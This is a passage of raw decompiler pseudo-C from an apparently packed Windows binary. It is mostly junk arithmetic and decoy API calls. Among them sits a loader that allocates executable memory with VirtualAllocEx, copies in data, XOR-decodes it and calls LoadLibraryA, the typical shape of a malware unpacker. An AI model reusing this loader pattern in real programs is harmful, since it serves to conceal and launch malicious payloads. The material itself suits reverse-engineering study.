								*(ebp_703 - 0x50) = *(ebp_703 - 0x50) ^ edx_2016;
								*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - edx_2016;
								*(ebp_703 - 0x50) = *(ebp_703 - 0x50) & edx_2016;
								*(ebp_703 - 0x50) = *(ebp_703 - 0x50) ^ edx_2016;
								*(ebp_703 - 0x50) = edx_2007;
								*(ebp_703 - 88) = *(ebp_703 - 88) & edx_2007;
								*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + edx_2016;
							}
							*(ebp_703 - 88) = *(ebp_703 - 88) + 0x01;
							uint32 eax_1267 = (*(ebp_703 - 88) | *(ebp_703 - 0x50)) & ecx_1210;
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - eax_1267;
							ui32 edx_1260 = 0x00;
							ui32 eax_1271 = eax_1267 + 0x07;
							if (eax_1267 <= 0x07)
							{
								ui32 ecx_1992 = (eax_1267 + 0x07 & 0x0900) - 0xA3 | *(ebp_703 - 88);
								ui32 eax_1993 = eax_1267 + 0x07 & ecx_1992;
								*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + (eax_1993 - 0x01);
								*(ebp_703 - 0x50) = *(ebp_703 - 0x50) & eax_1993 - 0x01;
								eax_1271 = eax_1993 - 0xF1 - ecx_1992;
							}
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) & eax_1271;
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) | 2524;
							word32 eax_1289 = 2525;
							if (*(ebp_703 - 88) >= 2525)
							{
								edx_1260 = *(ebp_703 - 0x54) ^ 0x00;
								if (*(ebp_703 - 0x50) >= 2525)
								{
l00416193:
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + edx_1260;
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + edx_1260;
									*(ebp_703 - 88) = *(ebp_703 - 88) | edx_1260;
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - 0x3A;
									uint32 ecx_1308 = (*(ebp_703 - 88) & 0x3A) + *(ebp_703 - 0x54);
									ui32 ecx_1313 = (word32) (SEQ(ecx_1308, ecx_1308) + *(ebp_703 - 0x54)) | *(ebp_703 - 88);
									*(ebp_703 - 88) = eax_1289;
									uint32 ecx_1319 = ecx_1313 + *(ebp_703 - 0x50) + *(ebp_703 - 0x54);
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - (SEQ(ecx_1319, ecx_1319) < 0x00);
									*(ebp_703 - 88) = 0x00;
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - 0x01;
									ui32 eax_1332 = *(ebp_703 - 88) & 0x00 | *(ebp_703 - 0x50);
									*(ebp_703 - 88) = *(ebp_703 - 88) - eax_1332;
									ui32 edx_1336 = *(ebp_703 - 88);
									ui32 edx_1338 = edx_1336 | *(ebp_703 - 0x54);
									ui32 eax_1344 = (eax_1332 + edx_1336 + edx_1338 ^ edx_1338) + *(ebp_703 - 0x54) + *(ebp_703 - 0x50);
									uint32 ecx_1350 = *(ebp_703 - 0x50) - eax_1344 | eax_1344;
									*(ebp_703 - 88) = *(ebp_703 - 88) ^ eax_1344;
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + 0x01;
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | eax_1344;
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) ^ ecx_1350;
									*(ebp_703 - 88) = *(ebp_703 - 88) + ecx_1350;
									if (*(ebp_703 - 0x50) >= ecx_1350)
									{
										*(ebp_703 - 88) = *(ebp_703 - 88);
										*(ebp_703 - 88) = 0x00;
										*(ebp_703 - 0x54) = *(ebp_703 - 0x54) & 0x00;
										eax_1344 = ecx_1350 ^ 0x00;
										if (*(ebp_703 - 88) >= (ecx_1350 ^ 0x00))
											eax_1344 = (ecx_1350 ^ 0x00) + 0x01;
									}
									if (edx_1338 != *(ebp_703 - 88))
									{
										*(ebp_703 - 88) = *(ebp_703 - 88) - 0x01;
										*(ebp_703 - 88) = *(ebp_703 - 88) + 0x8B;
										uint32 edx_1925 = *(ebp_703 - 0x50) | 0x8B;
										if (edx_1925 > 0x00)
											*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | edx_1925;
									}
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | eax_1344;
									*(ebp_703 - 0x50) = 0x03B6;
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | 0x03B6;
									uint32 v286_1394 = *(ebp_703 - 0x50) + 0x03B6;
									*(ebp_703 - 0x50) = v286_1394;
									*(ebp_703 - 88) = (word32) ((byte) (v286_1394 < 0x00) + (*(ebp_703 - 88) + 0x03B6));
									uint32 v288_1400 = *(ebp_703 - 0x50) + eax_1344;
									*(ebp_703 - 0x50) = v288_1400;
									*(ebp_703 - 88) = (word32) ((byte) (v288_1400 < 0x00) + (*(ebp_703 - 88) + eax_1344));
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) ^ 0x03B6;
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - 0x03B6;
									uint32 edx_1420 = *(ebp_703 - 88) + 0x0BF9;
									uint32 v292_1426 = *(ebp_703 - 88) - edx_1420 - (edx_1420 < 0x00);
									*(ebp_703 - 88) = v292_1426;
									*(ebp_703 - 0x54) = (word32) ((byte) (v292_1426 < 0x00) + (*(ebp_703 - 0x54) + edx_1420));
									ui32 eax_1416 = 299;
									if (*(ebp_703 - 0x50) > edx_1420)
									{
										*(ebp_703 - 0x54) = (word32) ((byte) (*(ebp_703 - 0x50) < edx_1420) + (*(ebp_703 - 0x54) + 299));
										eax_1416 = (*(ebp_703 - 0x50) ^ *(ebp_703 - 0x54)) + *(ebp_703 - 0x50);
										edx_1420 = edx_1420 | eax_1416;
										*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + edx_1420;
										*(ebp_703 - 88) = *(ebp_703 - 88) - edx_1420;
										*(ebp_703 - 88) = *(ebp_703 - 88) + 0x01;
										*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | edx_1420;
										*(ebp_703 - 0x54) = *(ebp_703 - 0x54) & edx_1420;
									}
									uint32 eax_1439 = eax_1416 + edx_1420;
									uint32 edx_1445 = *(ebp_703 - 0x54) - *(ebp_703 - 88) - (eax_1439 < 0x00) & eax_1439;
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + 0x01;
									*(ebp_703 - 88) = *(ebp_703 - 88) + 0x01;
									*(ebp_703 - 88) = *(ebp_703 - 88) - edx_1445;
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - edx_1445;
									*(ebp_703 - 88) = *(ebp_703 - 88) ^ edx_1445;
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) & edx_1445;
									uint32 edx_1460 = edx_1445 + eax_1439;
									if (true)
									{
										*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + 0x01;
										*(ebp_703 - 88) = *(ebp_703 - 88) | 0xF6;
										*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + 0xF6;
									}
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) | edx_1460;
									ui32 eax_1483 = *(ebp_703 - 0x54);
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - 0x01;
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) ^ 9447;
									ui32 ecx_1490 = eax_1483 | 9447 | eax_1483;
									ui32 eax_1491 = *(ebp_703 - 0x54);
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - ecx_1490;
									*(ebp_703 - 88) = ecx_1490;
									*(ebp_703 - 88) = *(ebp_703 - 88) | ecx_1490 + 0x02;
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + 0x01;
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) ^ 0x00;
									*(ebp_703 - 88) = 0x00;
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) & 0x00;
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - eax_1491;
									uint32 edx_1522 = *(ebp_703 - 0x50) ^ 0x00 ^ eax_1491 | eax_1491;
									*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - (edx_1522 + 0x01);
									ui32 ecx_1502 = 0x00;
									ui32 eax_1506 = eax_1491;
									if (edx_1522 <= ~0x4C)
									{
										*(ebp_703 - 0x54) = *(ebp_703 - 0x54) ^ 0x00;
										*(ebp_703 - 88) = edx_1522 + 0x01;
										*(ebp_703 - 88) = *(ebp_703 - 88) - (edx_1522 + 0x01);
										eax_1506 = 0x00;
										if (edx_1522 + 0x01 == *(ebp_703 - 88))
										{
l00416363:
											*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - 0x68;
											*(ebp_703 - 88) = *(ebp_703 - 88) & 0x68;
											if (0x01 != 0x00)
											{
												uint32 v323_1835 = *(ebp_703 - 0x54);
												*(ebp_703 - 0x54) = v323_1835;
												*(ebp_703 - 0x54) = 0x00;
												*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - 0x01;
												ecx_1502 = (ui32) ((byte) (v323_1835 < 0x00) + *(ebp_703 - 0x54));
											}
											uint32 edx_1558 = *(ebp_703 - 0x54) | ecx_1502;
											*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - edx_1558;
											Eq_9034 C_1568 = cond(*(ebp_703 - 0x54) - edx_1558);
											if (*(ebp_703 - 0x54) >= edx_1558)
											{
												*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - ecx_1502 - (*(ebp_703 - 0x54) < edx_1558);
												*(ebp_703 - 0x54) = *(ebp_703 - 0x54) ^ ecx_1502;
												*(ebp_703 - 0x54) = *(ebp_703 - 0x54);
												*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - 0x01;
												*(ebp_703 - 0x50) = *(ebp_703 - 0x50) ^ 0x00;
												ui32 edx_1798 = edx_1558 & ecx_1502;
												ecx_1502 = (edx_1798 - 0x01 & 0x00 ^ edx_1798 - 0x01) - *(ebp_703 - 0x54);
												*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + 0x01;
												*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + 0x01;
												*(ebp_703 - 0x50) = *(ebp_703 - 0x50) & ecx_1502;
												ui32 edx_1816 = edx_1798 - 0x01 + ecx_1502;
												*(ebp_703 - 0x54) = edx_1816;
												*(ebp_703 - 0x54) = edx_1816;
												C_1568.u0 = false;
											}
											uint32 edx_1578 = 0x04DE - eax_1506;
											ui32 ecx_1573 = ecx_1502 - *(ebp_703 - 0x50) - C_1568;
											*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + (edx_1578 + 0x01);
											if (edx_1578 + 0x81 <= *(ebp_703 - 88))
											{
												*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + 0x01;
												*(ebp_703 - 88) = *(ebp_703 - 88) - 151;
												if (false)
												{
l00416404:
													ui32 eax_1598 = *(ebp_703 - 0x50) + 0x01 - ecx_1573 & ecx_1573 | *(ebp_703 - 88);
													*(ebp_703 - 0x54) = eax_1598;
													*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - eax_1598;
													*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - eax_1598;
													if (true)
													{
														word32 ecx_1745 = *(ebp_703 - 88);
														*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - ecx_1745;
														*(ebp_703 - 88) = *(ebp_703 - 88) ^ ecx_1745;
														*(ebp_703 - 88) = *(ebp_703 - 88) + 0x01;
														uint32 ecx_1753 = ecx_1745 - (eax_1598 + 0x01);
														ecx_1573 = (ui32) ((byte) (ecx_1753 < 0x00) + (ecx_1753 + *(ebp_703 - 88)));
													}
													ui32 eax_1617 = eax_1598 + 0x01 ^ *(ebp_703 - 0x54);
													uint32 edx_1624 = (*(ebp_703 - 0x50) & 166) - *(ebp_703 - 0x54) ^ eax_1617 | eax_1617 | eax_1617;
													if (edx_1624 <= 0x00)
													{
														*(ebp_703 - 0x50) = 0x25;
														*(ebp_703 - 88) = *(ebp_703 - 88) - 0x25;
														ui32 eax_1729 = (edx_1624 & 0x25) - *(ebp_703 - 0x50) | *(ebp_703 - 0x50);
														if (true)
														{
															*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + eax_1729;
															edx_1624 = edx_1624 - 0xFA;
														}
													}
													ui32 eax_1636 = 0x00 - *(ebp_703 - 0x54) + *(ebp_703 - 88) + edx_1624 | edx_1624;
													*(ebp_703 - 0x50) = *(ebp_703 - 0x50) | eax_1636;
													*(ebp_703 - 0x54) = eax_1636;
													*(ebp_703 - 0x50) = *(ebp_703 - 0x50) ^ edx_1624;
													*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - edx_1624;
													*(ebp_703 - 88) = edx_1624;
													uint32 eax_1641 = eax_1636 & edx_1624;
													if (*(ebp_703 - 88) != eax_1641)
													{
														ui32 eax_1703 = eax_1641 - *(ebp_703 - 88) - (*(ebp_703 - 88) < eax_1641);
														*(ebp_703 - 88) = *(ebp_703 - 88) + 0x01;
														*(ebp_703 - 88) = *(ebp_703 - 88) - 0x01;
														*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - 0x01;
														*(ebp_703 - 88) = *(ebp_703 - 88) & eax_1703;
													}
													word32 edx_1662;
													word32 ebx_1663;
													word32 esi_1664;
													word32 edi_1665;
													*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | fn00411DB0(ecx_1573, &esi_886->dwFFFEE1D1, edi_881, out edx_1662, out ebx_1663, out esi_1664, out edi_1665);
													ui32 ecx_1675 = *(ebp_703 - 0x50) + 0x5E;
													ui32 eax_1679 = *(ebp_703 - 0x50) ^ 3227;
													*(ebp_703 - 0x50) = *(ebp_703 - 0x50) & ecx_1675;
													*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - eax_1679;
													word32 eax_1685 = eax_1679 + *(ebp_703 - 88);
													*(esp_701 - 0x04) = *(ebp_703 - 88);
													ExitThread(*(esp_701 - 0x04));
													byte cl_1677;
													*clOut = (byte) ecx_1675;
													byte ch_1678;
													*chOut = SLICE(ecx_1675, byte, 8);
													word32 ebp_1694;
													*ebpOut = *ebp_703;
													return eax_1685;
												}
											}
											goto l00416404;
										}
									}
									eax_1506 = eax_1506 & *(ebp_703 - 0x54);
									goto l00416363;
								}
								uint32 eax_1977 = 2525 - edx_1260 + 0x12 + *(ebp_703 - 0x50);
								uint32 eax_1980 = (byte) (eax_1977 < 0x00) + (eax_1977 + *(ebp_703 - 88));
								eax_1289 = eax_1980 - *(ebp_703 - 88) - (eax_1980 < 0x00);
							}
							*(ebp_703 - 88) = *(ebp_703 - 88) - 0x01;
							*(ebp_703 - 0x54) = eax_1289;
							goto l00416193;
						}
					}
					goto l00415CF2;
				}
				ecx_2468 = ecx_2468 | *(ebp - 0x50);
			}
			*(ebp - 0x50) = *(ebp - 0x50) + (edx_315 + 0x01);
			goto l004158E7;
		}
	}
	*(ebp - 0x54) = *(ebp - 0x54) + edx_128;
	*(ebp - 0x54) = edx_128;
	goto l0041575D;
}

// 004167AD: Register Eq_85 fn004167AD()
Eq_85 fn004167AD()
{
	GetCursor();
	Eq_66 eax_10 = GetModuleHandleA(null);
	if (true)
	{
		if (eax_10 < 3358)
		{
l004167F6:
			IsChild(dwLoc0300, dwLoc0318);
			GetOEMCP();
			GetVersionExA(fp - 0x0188);
			uint32 edx_93 = dwLoc0288 - dwLocE0 ^ IsChild(dwLoc0248, dwLoc0150);
			GetCommandLineA();
			word32 ecx_124;
			fn00416E0A(dwLoc0150, out ecx_124);
			GetModuleHandleA(null);
			ui32 v21_128 = dwLoc0240 ^ ecx_124;
			if (dwLoc88 > 0x05B2)
				dwLoc98 = dwLoc98 - 0xF6;
			word32 ecx_205;
			uint32 edx_226 = (dwLoc02DC ^ dwLoc0118) - dwLoc68 & fn00416E0A(0x00, out ecx_205);
			if (edx_226 < dwLoc0134)
			{
				if ((edx_226 ^ 0x00) - dwLoc026C != 0x00)
				{
l00416995:
					uint32 edx_263 = 0x00 - dwLoc98;
					word32 ecx_299;
					fn00416E0A(dwLoc0108 - v21_128 - (SEQ(edx_263, edx_263) + _ < 0x00) + 0x01 | dwLoc0338, out ecx_299);
					return dwLoc0318;
				}
			}
			goto l00416995;
		}
	}
	goto l004167F6;
}

// 00416E0A: Register word32 fn00416E0A(Register Eq_85 ecx, Register out ptr32 ecxOut)
word32 fn00416E0A(Eq_85 ecx, ptr32 & ecxOut)
{
	BOOL eax_56 = IsChild(dwLocE0, dwLoc01F4);
	word32 ecx_68;
	*ecxOut = (word32) eax_56 + ((dwLocA8 ^ eax_56) - 0x01) + 0x0300 ^ 0x00;
	return 0x00;
}

// 0041736A: Register ui32 fn0041736A(Register ui32 ecx, Register out ptr32 edxOut, Register out ptr32 ediOut)
ui32 fn0041736A(ui32 ecx, ptr32 & edxOut, ptr32 & ediOut)
{
	word32 edi_33;
	*ediOut = fn004167AD();
	word32 eax_62 = VirtualAllocEx((void *) ~0x00, 0x00, 0x0200, dwLoc01AC, dwLocDC) + dwLoc017C + dwLoc01F0;
	ui32 edx_65 = dwLoc01B4 - dwLoc0184 - (dwLoc01B4 < 0x00) & eax_62 ^ eax_62 | eax_62;
	ui32 eax_70 = (edx_65 ^ 191) + dwLoc68;
	word32 edx_76;
	*edxOut = (edx_65 - eax_70 & eax_70) - eax_70;
	return eax_70;
}

// 0041762E: FlagGroup bool fn0041762E(Register Eq_35 eax, Register ui32 ecx, Register ui32 edi, Register out ptr32 eaxOut, Register out ptr32 ecxOut, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
bool fn0041762E(Eq_35 eax, ui32 ecx, ui32 edi, ptr32 & eaxOut, ptr32 & ecxOut, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	*ebxOut = ebx;
	uint32 edx_17 = dwLoc0134 - ecx + ecx;
	if (edx_17 > dwLoc01D4)
	{
		dwLoc013C = dwLoc013C | edx_17;
		dwLoc0118 = dwLoc0118 + edx_17;
		dwLocA4 = dwLocA4 + edx_17;
	}
	Eq_35 eax_55;
	word32 edx_56;
	uint32 ecx_112 = ~0x00 - dwLoc01C0 - fn00412F4E(eax, out eax_55, out edx_56);
	uint32 edx_75 = 1901 - dwLoc01CC - (ecx_112 < 0x00);
	uint32 dwLoc0208_1141 = dwLoc0208 & ~0x00;
	if (dwLoc013C != (byte) (edx_75 < 0x00) + (edx_75 + dwLoc01A0))
	{
		ecx_112 = dwLoc0220 + 0x0310;
		dwLoc0230 = dwLoc0230 + 0x0F;
		dwLoc0190 = dwLoc0190 - 0x01;
		dwLoc0174 = dwLoc0174 + 0x01;
	}
	uint32 ecx_114 = ecx_112 - dwLocF4;
	uint32 edx_133 = 0x00 - dwLocF8 & (word32) (SEQ(ecx_114, ecx_114) - _) + 0x01;
	ui32 eax_166;
	word32 edx_167;
	fn00412F4E(eax_55, out eax_166, out edx_167);
	ui32 ecx_188 = (dwLoc0168 & eax_166) - 0x01 & eax_166;
	if (ecx_188 != 0x00)
	{
		uint32 eax_2872 = (dwLoc0168 | ecx_188) - dwLoc0218 - dwLoc0108;
		if (eax_2872 <= 0x00)
		{
			dwLoc0200 = dwLoc0200 | eax_2872;
			dwLoc0150 = dwLoc0150 & eax_2872;
		}
	}
	ui32 ecx_234 = ecx_188 | dwLoc0124;
	Eq_66 esi_251 = LoadLibraryA(&globals->t404098);
l0041779C:
	Eq_10009 v36_299 = (char *) &dwLoc98->unused + 0x06AD;
	uint32 edx_303 = 0x06AC - edi;
	uint32 v38_304 = dwLoc0174 - edx_303;
	uint32 v39_306 = dwLoc0188 - edx_303;
	dwLoc98 = v36_299;
	dwLoc0174 = v38_304;
	dwLoc0188 = v39_306;
	if (edx_303 >= 0xC3)
	{
		dwLoc022C = dwLoc022C ^ 0xE6;
		dwLoc0130 = dwLoc0130 - 0xE6;
		edi = (edx_303 - 0x4F - dwLoc01A0 | 0xE6) - 0x01;
	}
	esi_251 = (word32) esi_251 + 0x01;
	uint32 eax_352 = (dwLoc0224 ^ 228) - dwLoc019C + 0x4C ^ ecx_234;
	if (true)
	{
		ui32 ecx_2803 = (eax_352 - 0x1564 ^ 0x00) - (eax_352 - 0x1564) ^ dwLoc0160 ^ eax_352 - 0x1564 | eax_352 - 0x1564;
		ecx_234 = ecx_2803 - 0x01;
		if (eax_352 > 0x1564)
		{
l0041785B:
			if (*esi_251 != 0x75FF1075)
				goto l0041779C;
			ui32 edx_401 = *((word32) esi_251 - 0x01);
			Eq_162 eax_413 = VirtualAllocEx((void *) ~0x00, 0x00, 0x0001A000, 0x1000, 0x40);
			GetVersionExA(fp - 0x01E0);
			IsChild(dwLoc01B4 - 0x01, dwLoc90 + 0x01);
			Eq_10047 v51_452 = dwLoc01A4 & (GetCursor() - (struct HICON__ *) 0xB6 ^ dwLoc0110);
			GetOEMCP();
			ui32 eax_476 = (445 - dwLoc01FC ^ 0x00) - ecx_234;
			uint32 v55_482 = dwLoc010C & eax_476;
			ui32 v56_486 = (dwLoc01CC & 0x00) + eax_476;
			uint32 eax_488 = eax_476 | ((ecx_234 + eax_476) - eax_476) + 0x01;
			GetVersionExA(fp - 0xD8);
			GetCursor();
			ui32 eax_544 = (byte) ((byte) (dwLoc0168 + dwLoc0144 < 0x00) + (dwLoc0230 + dwLoc0144) < 0x00) + ((dwLoc0144 - 0x02) + dwLoc01DC) | dwLocC4;
			if (eax_544 != 0x00)
			{
				dwLocDC = (word32) dwLocDC + 88;
				dwLoc01F0 = dwLoc01F0 + (eax_544 - 0x1E01);
			}
			GetCommandLineA();
			if (dwLoc01B8 <= 0x00)
			{
				ui32 eax_2645 = dwLoc0134 ^ 0xA3 ^ dwLoc015C;
				dwLoc0160 = (Eq_9988) ((word32) dwLoc0160 + 0x00A3);
				dwLoc01F0 = dwLoc01F0 ^ ((dwLoc01B8 ^ eax_2645) - eax_2645) + 0xE0;
			}
			GetVersionExA(fp - 0x021C);
			Eq_85 ecx_706 = dwLoc020C & 0x0A00 ^ fp - 0x021C;
			ui32 dwLocD4_2544 = dwLocD4 + 0x01;
			Eq_85 v72_646 = dwLoc0150 - ~0xAE;
			ui32 v74_660 = dwLoc0200 | ~0xAE;
			Eq_35 eax_2552 = GetOEMCP();
			ui32 ecx_709 = ecx_706 | fp - 0x021C | fp - 0x021C;
			if (true)
			{
				dwLoc0190 = dwLoc0190 + 1135;
				dwLocEC = fp - (struct _OSVERSIONINFOA *) 0x021C + (ecx_709 + 0x01) / 0x0098 ^ fp - (struct _OSVERSIONINFOA *) 0x021C;
			}
			ui32 edi_746 = dwLoc0220 ^ dwLocEC;
			ui32 v82_748 = dwLoc01DC - ~0xAE + edi_746;
			ui32 edi_2546 = edi_746 | eax_2552 | eax_2552;
			if (true)
			{
				dwLoc0208_1141 = 118;
				eax_2552 = ((edi_2546 ^ 118) & edi_2546) - dwLocF0;
				if (dwLoc0170 == eax_2552)
				{
l00417BB2:
					word32 edi_805 = dwLoc022C & 3431 ^ ((eax_2552 + 0x4C | edi_2546) + 0x01) + edi_2546;
					ui32 edi_1140 = edi_805 - 0x01;
					if (edi_805 < 0x01)
					{
						uint32 eax_2512 = 0x042D - dwLoc01AC;
						if (eax_2512 <= 0x00)
						{
l00417C07:
							memcpy(eax_413, edx_401 + 19904270, 0x0EC6);
							GetCommandLineA();
							GetVersionExA(fp - (struct _OSVERSIONINFOA *) 0xD8);
							uint32 v94_820 = dwLoc014C - ~0xAE & edi_805 - 0x01;
							Eq_85 edx_2430 = dwLocDC;
							uint32 ecx_875 = 2245 - (IsChild(dwLocDC, dwLoc0164) - 2245);
							GetCommandLineA();
							GetOEMCP();
							uint32 eax_916 = (dwLoc01D8 ^ ~0xAE) - dwLocD4_2544 - dwLocDC;
							ui32 eax_921 = (word32) (SEQ(v30, eax_916) - SEQ(eax_916, dwLocDC));
							if (true)
								edx_2430 = 0x00 - dwLoc023C - (v55_482 < 0x00);
							GetModuleHandleA(null);
							uint32 v106_962 = (word32) edx_2430 + dwLoc01F0;
							uint32 ecx_988 = (byte) (v106_962 < 0x00) + ((dwLoc01C4 | ~0xAE) + 133);
							uint32 dwLoc010C_1667 = v55_482;
							Eq_10303 v103_955 = eax_921 + 0x3C & ~0xAE;
							Eq_85 v104_958 = dwLoc0110 + 0x01;
							ui32 v107_991 = dwLoc0190 - ecx_988 - (ecx_988 < 0x00);
							if (ecx_988 == 2737)
							{
								dwLoc01F8 = dwLoc01F8 + 0x01;
								if (false)
								{
l00417D49:
									IsChild(ecx_706, dwLocB0 + 0x01);
									IsChild(dwLoc0130, dwLoc0178);
									word32 edx_1069 = dwLoc0178 + v36_299;
									ui32 ecx_1081 = edx_1069 + ((dwLoc0144 ^ 0x0C0F) & edx_1069) / 0x04;
									ui32 v110_1044 = dwLoc0180 | ((dwLocD0 | dwLocB0 + 0x01) + 0x1600 | dwLocB0 + 0x01) + 0x1C00;
									uint32 v111_1091 = dwLoc01F4 | ecx_1081;
									Eq_162 edx_1106 = eax_413;
									word32 eax_1115 = 0x1000;
									do
									{
										ui32 edi_1158 = dwLocA4 & v107_991;
										uint32 v119_1160 = dwLoc0208_1141 - edi_1158;
										*edx_1106 = (((*edx_1106 ^ 3932659152) + 3932659152 ^ 3932659152) + 3932659152 ^ 3932659152) + 3932659152;
										ui32 v116_1148 = dwLoc015C + 0x69;
										ui32 v117_1150 = dwLoc0220 - 0x01;
										word32 v118_1152 = dwLocCC + 0x01;
										uint32 v120_1164 = dwLocD0 - edi_1158 - (v119_1160 < 0x00);
										uint32 edi_1167 = edi_1158 + dwLoc01C8;
										dwLoc015C = v116_1148;
										dwLoc0220 = v117_1150;
										dwLocCC = v118_1152;
										dwLoc0208_1141 = v119_1160;
										dwLocD0 = v120_1164;
										edi_1140 = (word32) (SEQ(edi_1167, edi_1167) + _) - 0x8E - v110_1044;
										edx_1106 = edx_1106 + 0x04;
										eax_1115 = eax_1115 - 0x01;
										ui32 edi_2987 = edi_1140;
									} while (eax_1115 != 0x00);
									ui32 ecx_1238 = GetVersionExA(fp - (struct _OSVERSIONINFOA *) 0x015C) - dwLoc0160 - v103_955 | (dwLoc01E0 & 0x00) + dwLocC4 | v119_1160;
									GetModuleHandleA(null);
									uint32 ecx_1244 = ecx_1238 ^ dwLoc022C;
									GetCursor();
									GetCommandLineA();
									uint32 eax_1262 = (ecx_1244 ^ 0x1E) - 0x01;
									ui32 edx_1300 = 0x24 - dwLoc01AC & (v106_962 & (ecx_1244 ^ 0x1E));
									word32 edi_1218;
									*ediOut = fp - (struct _OSVERSIONINFOA *) 0x015C;
									word32 v127_1274 = v74_660 - ~0xAE - eax_1262 - (((dwLoc0214 - 0x01) - eax_1262) - (dwLocB4 - (((dwLoc0164 + (dwLocF8 ^ 0x00)) + ((ecx_1244 + dwLoc0128) + v39_306 <u 0x00) | dwLoc01AC) | v116_1148) <u 0x00) <u 0x00);
									word32 dwLoc0140_1281 = dwLoc0140 - 0x01;
									ui32 v134_1311 = (word32) edx_1106 + v82_748 | edx_1300;
									word32 esi_1332;
									*esiOut = ~0x00EF8A00;
									if (edx_401 != ~0x00EF8A00)
									{
										GetCursor();
										uint32 ecx_2141 = v118_1152 + v111_1091;
										if ((((word32) (SEQ(dwLoc0118, ecx_2141 - 0x1500) + SEQ(ecx_2141 - 0x1500, v111_1091)) ^ edx_1300) & edx_1300) < 0x1F00)
											edx_1300 = 0xB9;
										ui32 ecx_2172 = (dwLoc0238 ^ 0x00) + edx_1300;
										word32 ecx_2180;
										*ecxOut = ecx_2172 + 0x1E00;
										uint32 eax_2213 = v127_1274 + 0xFE | dwLocAC;
										word32 eax_2215;
										*eaxOut = eax_2213 + 6655;
										bool C_2238 = cond(eax_2213 + 6655 - dwLocF0);
										if (eax_2213 + 6655 >= dwLocF0)
											C_2238 = cond(eax_2213 + 0x19BF);
										return C_2238;
									}
									GetCursor();
									GetCommandLineA();
									ui32 edx_1504 = (edi_2987 - dwLocC0 ^ dwLoc01F8) + 0x0300 | (word32) (SEQ(dwLocA0 + 0x01, ~0x5C) + SEQ(~0x5C, v94_820));
									ui32 eax_1520 = v36_299 & edx_401;
									uint32 v144_1521 = dwLoc01A8 - ~0xAD & eax_1520;
									uint32 eax_1524 = eax_1520 ^ edx_401;
									uint32 ecx_1551 = 177 - edx_1504;
									ui32 v154_1562 = dwLoc0170 | edx_1504;
									IsChild(v72_646, v104_958);
									Eq_85 esi_1594 = v104_958;
									uint32 edx_1609 = (0x00 - dwLoc0144 + 232 ^ ecx_1551) + ecx_1551 + ecx_1551 | ecx_1551;
									if (edx_1609 >= 0x00)
										ecx_1551 = 0x02;
									uint32 edx_1640 = ecx_1551 + 0x15 & ecx_1551;
									ui32 edx_1641 = edx_1640 - 0x01;
									if (edx_1640 < 0x0827)
									{
										edx_1641 = edx_1640 + 0x1CDF;
										dwLoc010C_1667 = edx_1640 + 0x1CDF;
									}
									GetCursor();
									GetCommandLineA();
									ui32 edx_1677 = edx_1641 & v56_486 ^ dwLocA8;
									if ((edx_1677 | ~0x22) > dwLoc0108)
									{
										edx_1677 = 0x11;
										dwLoc0140_1281 = dwLoc0140 - 0x01 + ((((edx_1677 | ~0x22) & dwLocC4 ^ dwLoc0204) ^ 0x11) + 0x11);
									}
									GetCursor();
									GetCommandLineA();
									GetOEMCP();
									ui32 ecx_1733 = (edx_1677 ^ 0x0231) + eax_476;
									ui32 v185_1741 = v154_1562 + ecx_1733;
									ui32 v187_1748 = v103_955 & ecx_1733;
									word32 ebx_1781;
									*ebxOut = GetModuleHandleA(&globals->t4040BA);
									ui32 ecx_1790 = v158 ^ 0x24 ^ v104_958;
									if (true)
									{
										esi_1594 = (eax_476 ^ ecx_1790) - v117_1150 + dwLoc0140_1281;
										if (esi_1594 == 0xDD)
										{
l00418756:
